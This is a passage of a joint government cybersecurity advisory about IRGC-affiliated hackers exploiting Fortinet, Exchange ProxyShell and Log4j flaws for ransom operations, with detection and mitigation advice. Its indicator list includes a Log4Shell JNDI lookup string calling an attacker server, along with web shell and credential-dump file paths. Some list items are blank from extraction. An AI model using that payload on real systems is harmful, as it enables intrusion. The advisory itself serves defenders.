information on these Iranian government-sponsored APT actors exploiting known Fortinet and
Microsoft Exchange vulnerabilities to gain initial access to a broad range of targeted entities in
furtherance of malicious activities, including ransom operations. The authoring agencies now judge
these actors are an APT group affiliated with the IRGC.
Since the initial reporting of this activity in the FBI Liaison Alert System (FLASH) report APT Actors
Exploiting Fortinet Vulnerabilities to Gain Access for Malicious Activity from May 2021, the authoring
agencies have continued to observe these IRGC-affiliated actors exploiting known vulnerabilities for
initial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring
agencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities for initial
access. The IRGC-affiliated actors have used this access for follow-on activity, including disk
encryption and data extortion, to support ransom operations.
The IRGC-affiliated actors are actively targeting a broad range of entities, including entities across
multiple U.S. critical infrastructure sectors as well as Australian, Canadian, and United Kingdom
organizations. These actors often operate under the auspices of Najee Technology Hooshmand Fater
LLC, based in Karaj, Iran, and Afkar System Yazd Company, based in Yazd, Iran. The authoring
agencies assess the actors are exploiting known vulnerabilities on unprotected networks rather than
targeting specific targeted entities or sectors.
This advisory provides observed tactics, techniques and indicators of compromise (IOCs), that the
authoring agencies assess are likely associated with this IRGC-affiliated APT. The authoring
agencies urge organizations, especially critical infrastructure organizations, to apply the
recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from
these IRGC- affiliated cyber actors.

Threat Overview and Advisories webpage and the FBI’s Iran Threat webpage.

TECHNICAL DETAILS
Threat Actor Activity
As reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft
Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the authoring agencies
have observed Iranian government-sponsored APT actors scanning for and/or exploiting the following
known Fortinet FortiOS and Microsoft Exchange server vulnerabilities since early 2021 to gain initial
access to a broad range of targeted entities: CVE-2018-13379, CVE-2020-12812, CVE-2019-5591,
and CVE-2021-34473 (a ProxyShell vulnerability). The authoring agencies have also observed these
APT actors leveraging CVE-2021-34473 against U.S. networks in combination with ProxyShell
vulnerabilities CVE-2021-34523 and CVE-2021-31207. The NCSC judges that Yazd, Iran-based
company Afkar System Yazd Company is actively targeting UK organizations. Additionally, ACSC
judges that these APT actors have used CVE-2021-34473 in Australia to gain access to systems. The

APT actors can leverage this access for further malicious activities, including deployment of tools to
support ransom and extortion operations, and data exfiltration.
Since the activity was reported in 2021, these IRGC-affiliated actors have continued to exploit known
vulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange
vulnerabilities, the authoring agencies have observed these APT actors exploiting VMware Horizon
Log4j vulnerabilities CVE-2021-44228 (“Log4Shell”), CVE-2021-45046, and CVE-2021-45105 for
initial access.
The IRGC-affiliated actors have used their access for ransom operations, including disk encryption
and extortion efforts. After gaining access to a network, the IRGC-affiliated actors likely determine a
course of action based on their perceived value of the data. Depending on the perceived value, the
actors may encrypt data for ransom and/or exfiltrate data. The actors may sell the data or use the
exfiltrated data in extortion operations or “double extortion” ransom operations where a threat actor
uses a combination of encryption and data theft to pressure targeted entities to pay ransom demands.
IRGC-affiliated actor activity observed by the authoring agencies includes:
•

•

•

•

In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473,
CVE-2021-34523, and CVE-2021-31207) on a Microsoft Exchange server to gain access to
the network of a U.S. police department. The actors used their access to move laterally within
the network, encrypt network devices with BitLocker, and hold the decryption keys for ransom.
In December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473,
CVE-2021-34523, and CVE-2021-31207), on a Microsoft Exchange server to gain access to
the network of a U.S. regional transportation company. The actors used their access to move
laterally within the network, encrypt network devices with BitLocker, and hold the decryption
keys for ransom. This activity disrupted the transportation company’s operations for an
extended period.
In February 2022, the actors exploited a Log4j vulnerability (likely CVE-2021-44228, CVE2021-45046, and/or CVE-2021-45105) in a VMware Horizon application to gain access to the
network of a U.S. municipal government, move laterally within the network, establish
persistent access, initiate crypto-mining operations, and conduct additional malicious activity.
In February 2022, the actors may have exploited a Log4j vulnerability (likely CVE-2021-44228,
CVE-2021-45046, and/or CVE-2021) to gain access to the network of a U.S. aerospace
company. The actors leveraged a server that the authoring agencies assess is associated with
the IRGC-affiliated actors to exfiltrate data from the company's network.

Resource Development [TA0042]

The IRGC-affiliated actors have used the following malicious and legitimate tools [T1588.001,
T1588.002] for a variety of tactics across the enterprise spectrum:
•
•
•
•
•

Fast Reverse Proxy (FRP) for command and control (C2)
Plink for C2
Remote Desktop Protocol (RDP) for lateral movement
BitLocker for data encryption
SoftPerfect Network Scanner for system network configuration discovery

Note: For additional tools used by these IRGC-affiliated cyber actors, see joint CSA Iranian
Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities
in Furtherance of Malicious Activities.

Initial Access [TA0001]

As stated in the Technical Details section previously reported in joint CSA Iranian GovernmentSponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in
Furtherance of Malicious Activities, the IRGC-affiliated actors gained initial access by exploiting
known vulnerabilities [T1190].
The following IOCs, observed as of March 2022, are indicative of ProxyShell vulnerability exploitation
on targeted entity networks:
•

Web shells with naming conventions aspx_[11 randomly generated alphabetic
characters].aspx, login.aspx, or default.aspx in any of the following directories:
o C:\Program Files\Microsoft\Exchange
Server\V15\FrontEnd\HttpProxy\ecp\auth\
o C:\Program Files\Microsoft\Exchange
Server\V15\FrontEnd\HttpProxy\owa\auth\
o C:\inetpub\wwwroot\aspnet_client\

The following IOCs, observed as of December 2021, are indicative of Log4j vulnerability exploitation
on targeted entity networks:
•
•

${jdni:ldap//148.251.71.182:1389/RCE} (user agent string)
RCE.class

Execution [TA0002]

The IRGC-affiliated actors may have made modifications to the Task Scheduler [T1053.005]. These
modifications may display as unrecognized scheduled tasks or actions. Specifically, the below
established tasks may be associated with this activity:
•
•

CacheTask

Note: The potential exists that tasks associated with CacheTask or Wininet may be legitimate. For
additional tasks used by these IRGC-affiliated cyber actors, see joint CSA Iranian GovernmentSponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in
Furtherance of Malicious Activities.

Persistence [TA0003]

The IRGC-affiliated actors established new user accounts on domain controllers, servers,
workstations, and active directories [T1136.001, T1136.002]. The actors enabled a built-in Windows
account (DefaultAccount) and escalated privileges to gain administrator-level access to a network.
Some of these accounts appear to have been created to look similar to other existing accounts on the
network, so specific account names may vary per organization. In addition to unrecognized user
accounts or accounts established to masquerade as existing accounts, the following account
usernames may be associated with this activity:
•
•
•
•

Domain Admin
it_admin
DefaultAccount
Default01

Note: For additional account usernames associated with this activity, see joint CSA Iranian
Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities
in Furtherance of Malicious Activities.

Exfiltration [TA0010]

The authoring agencies have observed the IRGC-affiliated actors dumping and subsequently
exfiltrating the Local Security Authority Subsystem Service (LSASS) process memory on targeted
entity networks in furtherance of credential harvesting. The following IOCs are associated with data
exfiltration from targeted entity networks:
•
•
•
•

C:\Windows\Temp\sassl[.]pmd
C:\Windows\Temp\ssasl[.]zip
C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]dmp
C:\Users\DefaultAccount\AppData\Local\Temp\lsass[.]zip

Impact [TA0040]

The IRGC-affiliated actors forced BitLocker activation on host networks to encrypt data [T1486] and
held the decryption keys for ransom. The corresponding ransom notes were sent to the targeted
entity, left on the targeted entity network as a .txt file or printed on the targeted entity’s networked
printer(s). The notes included the following contact information:

DETECTION
The authoring agencies recommend that organizations using Microsoft Exchange servers, Fortinet
devices, and/or VMware Horizon applications investigate potential suspicious activity in their
networks.
• Search for IOCs. Collect known-bad IOCs and search for them in network and host artifacts.
Note: Refer to Appendix A for IOCs.
• Review Log4j vulnerabilities, including CVE-2021-44228, CVE-2021-45046, and CVE-202145105.
• Review Microsoft Exchange ProxyShell vulnerabilities, including CVE-2021-34473, CVE-202134523, and CVE-2021-31207.
• As a precaution, review additional Microsoft Exchange vulnerabilities, including CVE-202131196, CVE-2021-31206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470
because the authoring agencies have seen the actors broadly target Microsoft Exchange
servers.
• Investigate exposed Microsoft Exchange servers, both patched and unpatched, for
compromise.
• Review Fortinet FortiOS vulnerabilities, including CVE-2018-13379, CVE-2020-12812, and
CVE-2019-5591.
• Review VMware vulnerabilities, including any relevant vulnerabilities listed on the VMware
security advisory page.
• Investigate changes to RDP, firewall, and Windows Remote Management (WinRM)
configurations that may allow malicious cyber actors to maintain persistent access.
• Review domain controllers, servers, workstations, and active directories for new or
unrecognized user accounts.
• Review Task Scheduler for unrecognized scheduled tasks. Additionally, manually review
operating-system and scheduled tasks—including each step these tasks perform—for
unrecognized “actions.”
• Review antivirus logs for indications they were unexpectedly turned off.
• Look for WinRAR and FileZilla in unexpected locations.

Review servers and workstations for malicious executable files masquerading as legitimate
Windows processes. Malicious files may not be found in the expected directory and may have
cmd.exe or powershell.exe as their parent process.

Note: For additional approaches on uncovering malicious cyber activity, see joint advisory Technical
Approaches to Uncovering and Remediating Malicious Activity, authored by CISA and the
cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

MITIGATIONS
The authoring agencies urge network defenders to prepare for and mitigate potential cyber threats
immediately by implementing the mitigations below.

Implement and Enforce Backup and Restoration Policies and Procedures
•

•
•
•

Maintain offline (i.e., physically disconnected) backups of data, and regularly test
backup and restoration. These practices safeguard an organization’s continuity of
operations or at least minimize potential downtime from a ransomware or other destructive
data incident and protect against data losses.
o Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted),
and covers the entire organization’s data infrastructure.
Activate BitLocker on all networks and securely back up BitLocker keys with Microsoft and
with an independent offline backup.
Create, maintain, and exercise a basic cyber incident response plan that includes response
procedures for a ransom incident.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary
data and servers in a physically separate, segmented, secure location (e.g., hard drive,
storage device, the cloud).

Patch and Update Systems
•

•

•

U.S. federal, state, local, tribal, and territorial (SLTT) government and critical infrastructure
organization organizations: Implement free CISA Cyber Hygiene Services Vulnerability
Scanning to enable continuous scans of public, static IPs for accessible services and
vulnerabilities.
Install updates/patch operating systems, software, and firmware as soon as updates/patches
are released. Regularly check software updates and end-of-life notifications. Consider
leveraging a centralized patch management system to automate and expedite the process.
Immediately patch software affected by vulnerabilities identified in this advisory: CVE-202134473, CVE-2018-13379, CVE-2020-12812, CVE-2019-5591, CVE-2021-34523, CVE-202131207, CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-31196, CVE-202131206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470.

Evaluate and Update Blocklists and Allowlists

TLP: WHITE
Page 7 of 15 | Product ID: AA22-257A

TLP:WHITE
•
•

Regularly evaluate and update blocklists and allowlists.
If FortiOS is not used by your organization, add the key artifact files used by FortiOS to your
organization’s execution blocklist. Prevent any attempts to install or run this program and its
associated files.

Implement Network Segmentation
•

Implement network segmentation to restrict a malicious threat actor’s lateral movement.

Secure User Accounts
•
•

Audit user accounts with administrative privileges and configure access controls under the
principles of least privilege and separation of duties.
Require administrator credentials to install software.

Implement Multifactor Authentication
•

Use multifactor authentication where possible, particularly for webmail, virtual private networks
(VPNs), accounts that access critical systems, and privileged accounts that manage backups.

Use Strong Passwords
•

Require all accounts with password logins to have strong, unique passwords. See CISA Tip
Choosing and Protecting Passwords and National Institute of Standards and Technology
(NIST) Special Publication 800-63B: Digital Identity Guidelines for more information.

Secure and Monitor RDP and other Potentially Risky Services
•

•
•

If you use RDP, restrict it to limit access to resources over internal networks. After assessing
risks, if your organization deems RDP operationally necessary, restrict the originating sources,
and require MFA to mitigate credential theft and reuse. If RDP must be available externally,
use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the
connection before allowing RDP to connect to internal devices.
Disable unused remote access/RDP ports.
Monitor remote access/RDP logs, enforce account lockouts after a specified number of
attempts (to block brute force campaigns), and log RDP login attempts.

Use Antivirus Programs
•

Install and regularly update antivirus and anti-malware software on all hosts.

Secure Remote Access
•
•

Only use secure networks.
Consider installing and using a VPN for remote access.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and
validating your organization's security program against the threat behaviors mapped to the MITRE
ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your
existing security controls inventory to assess how they perform against the ATT&CK techniques
described in this advisory.
To get started:
1.
2.
3.
4.
5.

Select an ATT&CK technique described in this advisory (see Appendix B).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance
data.
6. Tune your security program, including people, processes, and technologies, based on the
data generated by this process.
The authoring agencies recommend continually testing your security program, at scale, in a
production environment to ensure optimal performance against the MITRE ATT&CK techniques
identified in this advisory.

RESPONDING TO RANSOMWARE OR EXTORTION INCIDENTS
If a ransomware or extortion incident occurs at your organization:
• Follow the Ransomware Response Checklist on page 11 of the CISA-Multi-State Information
Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
• Scan backups. If possible, scan backup data with an antivirus program to check that it is free
of malware. This should be performed using an isolated, trusted system to avoid exposing
backups to potential compromise.
• Follow the notification requirements as outlined in your cyber incident response plan.
o U.S. organizations: Report incidents to the FBI at a local FBI Field Office or the FBI
24/7 CyWatch at (855)292-3937 or cywatch@fbi.gov, CISA’s 24/7 Operations Center at
report@cisa.gov or (888) 282-0870, or the U.S. Secret Service (USSS) at a USSS Field
Office.
